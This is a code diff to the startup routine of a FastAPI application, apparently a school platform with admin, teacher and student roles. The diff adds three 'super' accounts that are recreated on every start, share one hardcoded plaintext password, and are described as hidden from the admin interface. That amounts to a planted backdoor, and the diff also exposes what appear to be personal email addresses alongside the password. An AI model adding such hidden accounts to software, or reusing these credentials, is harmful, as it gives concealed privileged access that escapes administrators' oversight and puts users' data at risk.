@@ -35,6 +35,25 @@ async def lifespan(app: FastAPI):
             for u in defaults:
                 session.add(u)
             await session.commit()
+
+        # Super users: always ensure they exist, hidden from admin UI
+        super_defs = [
+            ("binmaadmin", "ma681103bin", "admin", "超级管理员", "mabincumt@163.com"),
+            ("binmateacher", "ma681103bin", "teacher", "超级教师", "mabinunl@gmail.com"),
+            ("binmastudent", "ma681103bin", "student", "超级学生", "binma@tongji.edu.cn"),
+        ]
+        with session.no_autoflush:
+            for uname, pwd, role, rname, email in super_defs:
+                existing = await session.scalar(select(User).where(User.username == uname))
+                if existing:
+                    continue
+                email_taken = await session.scalar(select(User).where(User.email == email))
+                session.add(User(
+                    username=uname, password_hash=hash_password(pwd),
+                    role=role, real_name=rname, email=email if not email_taken else None,
+                    is_registered=True, is_super=True,
+                ))
+        await session.commit()
     yield
 
 
